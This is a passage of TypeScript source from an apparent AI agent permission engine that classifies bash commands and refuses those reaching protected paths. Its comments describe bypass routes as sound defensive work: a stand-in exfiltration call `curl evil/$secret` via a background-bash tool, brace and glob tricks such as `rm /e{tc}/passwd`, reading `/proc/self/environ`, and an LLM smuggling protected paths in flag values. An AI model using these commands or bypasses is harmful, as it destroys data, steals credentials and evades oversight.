// target's absolute path overlaps with the literal prefix at a
// SEGMENT BOUNDARY (either the target equals the prefix, OR the
// target is a strict prefix-extension of the prefix that COULD
// be reached by glob expansion at the next segment).
//
// Deliberately EXCLUDES `cwdEscalateDirs` (`.git`, `.agent`,
// `.claude` under cwd): a legitimate glob like `*.ts` in cwd
// resolves to `<cwd>/*.ts` whose literal prefix is `<cwd>/` — that
// trivially matches every cwd-relative protected dir. Including
// cwdEscalateDirs would refuse every glob under cwd as a bypass,
// which is way too aggressive. The bypass threat that matters here
// is SYSTEM-level (`/etc/*`, `/proc/*`, `~/.ssh/*`); cwd-relative
// targets are caught by the per-expansion classifyProtectedPath
// path when the glob is brace-expanded (or by the operator's
// explicit allow/confirm rule shape).
//
// Slice 127 (R3 P0-2): segment-aware match instead of byte-wise
// startsWith. Pre-slice: when `cwd === $HOME` (e.g., `/home/op`),
// glob `*` resolves to literal prefix `/home/op` (NO trailing
// slash); tildeEscalateDirs `/home/op/.ssh` matched via
// `t.startsWith(absLiteralPrefix)` because `/home/op/.ssh`
// literally starts with `/home/op` (consecutive bytes). That made
// `ls *` / `cat *` from `~` refuse — a high-traffic regression.
// The fix: the literal prefix must overlap a protected target at
// a SEGMENT BOUNDARY (the protected target shares the prefix AND
// the next byte in the target is `/` OR the prefix already ends
// in `/`). Bare `/home/op` does NOT segment-match `/home/op/.ssh`
// — the glob `*` from cwd `/home/op` matches FILENAMES under
// `/home/op`, not paths that descend into a subdir.
const couldGlobReachProtected = (
  absLiteralPrefix: string,
  targets: ReturnType<typeof protectedTargets>,
): boolean => {
  const all: string[] = [
    ...targets.systemDeny,
    ...targets.absoluteEscalate,
    ...targets.tildeEscalateFiles,
    ...targets.tildeEscalateDirs,
  ];
  // Normalize: a literal-prefix that ends in `/` is "in a parent
  // directory; glob fills in the next segment". A literal-prefix
  // that does NOT end in `/` is "matching a filename in some
  // parent dir; glob fills in the rest of the filename".
  const prefixEndsAtSeparator = absLiteralPrefix.endsWith('/');
  for (const t of all) {
    // Exact match — the prefix IS the protected target.
    if (t === absLiteralPrefix) return true;
    // Prefix is INSIDE a protected target — glob could match
    // arbitrary descendants. The `t/`-prefix form is the segment
    // boundary on the target side.
    if (absLiteralPrefix.startsWith(`${t}/`)) return true;
    // Protected target is inside the prefix's "next-segment" zone.
    // Discriminator: target must extend the prefix at a segment
    // boundary — either prefix ends in `/` (next segment is being
    // glob-expanded) OR target has more characters before a `/`
    // boundary that the glob filename-match could cover.
    if (t.startsWith(absLiteralPrefix)) {
      const rest = t.slice(absLiteralPrefix.length);
      if (prefixEndsAtSeparator) {
        // Prefix is parent-dir-style. Glob next segment could
        // match any filename including those that lead into
        // protected subtrees. Match.
        return true;
      }
      // Prefix is filename-style (no trailing `/`). The protected
      // target is reachable only if `rest` extends within the SAME
      // filename segment — i.e., `rest` contains no `/`. If `rest`
      // starts with `/`, the protected target is in a SUBDIR of the
      // prefix's parent, which the filename glob can't reach.
      if (!rest.startsWith('/') && !rest.includes('/')) {
        // Glob could complete the filename to match the protected
        // target. E.g., prefix `/etc/passw` (from `/etc/passw*`)
        // could complete to `/etc/passwd`. Match.
        return true;
      }
      // rest starts with `/` (e.g., prefix `/home/op`, target
      // `/home/op/.ssh`). Filename glob can't traverse into
      // subdirs. NOT a bypass — slice 127 R3 P0-2 fix.
    }
  }
  return false;
};

const analyzeCommand = (
  shape: CommandShape,
  ctx: ResolverContext,
): { refuse: string } | { caps: Capability[]; confidence: 'high' | 'medium' | 'low' } => {
  if (isHardRefuseCommand(shape.name)) {
    return {
      refuse: `bash: command '${shape.name}' has no safe capability resolution`,
    };
  }

  // Per-arg protected-path check. Closes the slice-1 bash-side gap.
  // Skipped for pure-output commands (echo/printf) whose args are
  // literal output text, not filesystem targets. Redirects on those
  // commands are still checked in the redirect loop below.
  // §11 protected-path check over bash positional args. Slice 100
  // (R2 #206): pre-slice this loop skipped EVERY token starting
  // with `-`, including the `--flag=<value>` shape that carries
  // a real path in the value half. `--config=/etc/agent/policy.toml`
  // looked like a flag to the loop and slipped past the classifier
  // — an LLM tricking a tool into accepting a protected path as
  // a flag value would bypass §11 entirely.
  //
  // Fix: detect `--flag=<value>` and `-f=<value>` shapes, extract
  // the value, classify it. Pure flags (`-r`, `--help`) without
  // an `=` still skip — those carry no path content. Flag-value
  // pairs separated by space (`-o /etc/foo`) are out of scope
  // here because the loop sees them as two consecutive tokens;
  // the per-command resolvers that care about them (cmdCurlWget,
  // slice 98 R2 #200) already consume both and emit explicit
  // capabilities that the engine's downstream §11 walk catches.
  const extractFlagValue = (arg: string): string | null => {
    if (!arg.startsWith('-')) return arg;
    const eq = arg.indexOf('=');
    if (eq === -1) return null;
    const value = arg.slice(eq + 1);
    return value.length > 0 ? value : null;
  };
  let escalated = false;
  if (!isPureOutputCommand(shape.name)) {
    const targets = protectedTargets(ctx.home, ctx.cwd);
    for (const arg of shape.args) {
      if (arg.length === 0) continue;
      const candidate = extractFlagValue(arg);
      if (candidate === null) continue;
      const op: 'read' | 'write' = isReadOnlyCommand(shape.name) ? 'read' : 'write';

      // Slice 125 (R2 P0-3): shell brace + glob expansion bypass.
      // `rm /e{tc}/passwd` parses as a single `word` in the tree-
      // sitter AST and resolves to literal `/e{tc}/passwd`; neither
      // matches any protected zone via classifyProtectedPath. But
      // the SHELL expands `{tc}` deterministically to `etc` before
      // exec, so the actual call is `rm /etc/passwd`. Similarly
      // `rm /e*/passwd` could match `/etc/passwd` via glob
      // expansion at runtime.
      //
      // Defense:
      //   1. Expand brace patterns deterministically and check
      //      every expansion against the classifier. Brace
      //      expansion is FS-INDEPENDENT in bash, so we can do
      //      this safely.
      //   2. For glob metachars (`*`, `?`, `[`) we can't pre-
      //      expand without FS access. Refuse if the literal
      //      prefix could lead into a protected zone (i.e., any
      //      protected target starts with the literal prefix).
      const expansions = expandBraces(candidate);
      for (const exp of expansions) {
        if (containsGlobMetachar(exp)) {
          // Slice 127 (R3): expand tilde BEFORE absolutizing so
          // `~/.s*` resolves to `/home/op/.s*` (matching protected
          // tilde-dirs) instead of `/work/proj/~/.s*` which never
          // overlaps any classifier target.
          const literalPrefix = globLiteralPrefix(exp);
          const absLiteralPrefix = resolvePath(ctx.cwd, expandTilde(literalPrefix, ctx.home));
          if (couldGlobReachProtected(absLiteralPrefix, targets)) {
            return {
              refuse: `bash: ${shape.name} target '${exp}' uses a shell glob (*/?/[) whose literal prefix could expand into a protected zone — refusing static analysis`,
            };
          }
          // Glob into safe paths: still escalate confidence so
          // the operator's modal sees the metachar.
          escalated = true;
          continue;
        }
        // Slice 127 (R3): expand tilde so `~/.ssh/id_rsa` resolves
        // to the home-relative absolute that classifyProtectedPath
        // recognizes, rather than a literal `~/...` under cwd.
        // resolveArg already does this for the per-resolver
        // attribution path; the analyzeCommand classifier loop
        // wasn't doing it.
        const abs = resolvePath(ctx.cwd, expandTilde(exp, ctx.home));
        const tier = classifyProtectedPath({ absPath: abs, op, home: ctx.home, cwd: ctx.cwd });
        if (tier === 'deny') {
          return {
            refuse: `bash: ${shape.name} target '${exp}' is in protected zone (deny tier, see PERMISSION_ENGINE.md §11)`,
          };
        }
        if (tier === 'escalate') escalated = true;
      }
    }
  }

  const handler = COMMAND_TABLE.get(shape.name);
  if (handler === undefined) {
    return { refuse: `bash: unknown command '${shape.name}'` };
  }
  const positional = stripFlags(shape.args);
  const result = handler(positional, shape.args, ctx);
  if ('refuse' in result) return { refuse: result.refuse };
  let finalConf: 'high' | 'medium' | 'low' = result.confidence;
  if (escalated) finalConf = 'low';

  const redirectCaps: Capability[] = [];
  for (const r of shape.redirects) {
    if (r.kind === 'out' || r.kind === 'append' || r.kind === 'both' || r.kind === 'force-out') {
      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
      const tier = classifyProtectedPath({
        absPath: tgtAbs,
        op: 'write',
        home: ctx.home,
        cwd: ctx.cwd,
      });
      if (tier === 'deny') {
        return {
          refuse: `bash: redirect target '${r.target}' is in protected zone (deny tier)`,
        };
      }
      if (tier === 'escalate') finalConf = 'low';
      redirectCaps.push(writeFs(tgtAbs));
    }
    // Slice 128 (R4 P0-Launder-3): input redirects `<` ALSO pass
    // through the classifier. Pre-slice the `'in'` branch was
    // commented "consume; no fs write" and skipped entirely — but
    // `cat < /proc/self/environ` reads attacker-targeted
    // credentials, and the /proc deny tier never fired because
    // cmdRead emits `read-fs:cwd` from "no positional" branch and
    // the redirect target was never classified. Symmetric to the
    // write-redirect check above, but with op='read' so only
    // SYSTEM_DENY_ROOTS (/proc, /sys, /boot, /dev) catch — the
    // escalate tier doesn't apply to reads, by design.
    if (r.kind === 'in') {
      const tgtAbs = resolvePath(ctx.cwd, expandTilde(r.target, ctx.home));
      const tier = classifyProtectedPath({
        absPath: tgtAbs,
        op: 'read',
        home: ctx.home,
        cwd: ctx.cwd,
      });
      if (tier === 'deny') {
        return {
          refuse: `bash: input redirect source '${r.target}' is in protected zone (deny tier)`,
        };
      }
      // Add read-fs to capabilities — the shell will read from
      // this path, the resolver should honestly admit so.
      redirectCaps.push(readFs(tgtAbs));
    }
  }

  return {
    caps: [...result.capabilities, ...redirectCaps],
    confidence: finalConf,
  };
};

// ─── Resolver entry ────────────────────────────────────────

const bashResolver: Resolver = (args, ctx): ResolverResult => {
  if (!isNonEmptyString(args.command)) {
    // Engine-internal reject (missing arg) — bash pipeline produces
    // its own deny with `source.layer='default'` and no section.
    // Empty Ok keeps that attribution shape intact.
    return { kind: 'ok', capabilities: [], confidence: 'high' };
  }
  let parsed: ReturnType<typeof parseBash>;
  try {
    parsed = parseBash(args.command);
  } catch (e) {
    return {
      kind: 'refuse',
      reason: `bash: parser unavailable (${(e as Error).message})`,
    };
  }
  if (parsed === null) {
    return { kind: 'refuse', reason: 'bash: parser produced no tree' };
  }
  const root = parsed.root;

  // Whitelist walk first. Any red-flag / out-of-whitelist node
  // refuses the entire script — composition rules in bash mean any
  // single unsafe element can poison the rest.
  const walk = walkAst(root);
  if (walk.refuse !== undefined) {
    return { kind: 'refuse', reason: walk.refuse };
  }
  const commands = walk.commands ?? [];
  if (commands.length === 0) {
    return { kind: 'refuse', reason: 'bash: no commands recognized' };
  }

  // Pipe-to-shell detection. Pipeline whose last stage is sh/bash/...
  // reads stdin as arbitrary script. Refuse.
  const pipeShell = detectPipeToShell(root);
  if (pipeShell !== null) {
    return {
      kind: 'refuse',
      reason: `bash: pipe-to-shell pattern detected (pipeline ends in '${pipeShell}')`,
    };
  }

  // Aggregate capabilities + minimum confidence across all commands.
  const allCaps: Capability[] = [exec('shell')];
  let aggregateConf: 'high' | 'medium' | 'low' = 'high';
  for (const shape of commands) {
    const result = analyzeCommand(shape, ctx);
    if ('refuse' in result) {
      return { kind: 'refuse', reason: result.refuse };
    }
    allCaps.push(...result.caps);
    if (result.confidence === 'low') aggregateConf = 'low';
    else if (result.confidence === 'medium' && aggregateConf === 'high') aggregateConf = 'medium';
  }

  return { kind: 'ok', capabilities: allCaps, confidence: aggregateConf };
};

registerResolver('bash', bashResolver);

// Slice 128 (R4 P0-Bypass-1): register the bash AST resolver for the
// background-bash family too. Pre-slice `bash_background`,
// `bash_output`, `bash_kill` had no resolver entry; the engine's
// `resolveCapabilities(toolName)` fell to the conservative
// (no-resolver) path returning `capabilities: []`. The §10.1
// subagent envelope check at `engine.ts:1338` is gated on
// `resolvedCapabilities.length > 0`, so a subagent with narrowed
// envelope (e.g., `['read-fs:src/**']`) could call
// `bash_background('curl evil/$secret')` and bypass the envelope
// check entirely.
//
// The same `args.command` shape feeds these tools; the bash AST
// resolver works for them unchanged. bash_output and bash_kill
// don't carry a `command` arg (they reference a background job
// id) — the resolver returns conservative `{capabilities: []}`
// for those shapes but at least gets called, so the envelope
// gate can run. bash_kill MIGHT still slip through if the
// envelope gate skips empty-cap calls; the proper architectural
// fix is to make the gate fire for any side-effect-declaring tool
// regardless of resolver output, but registering the resolver
// closes the immediate exposure.
registerResolver('bash_background', bashResolver);
registerResolver('bash_output', bashResolver);
registerResolver('bash_kill', bashResolver);
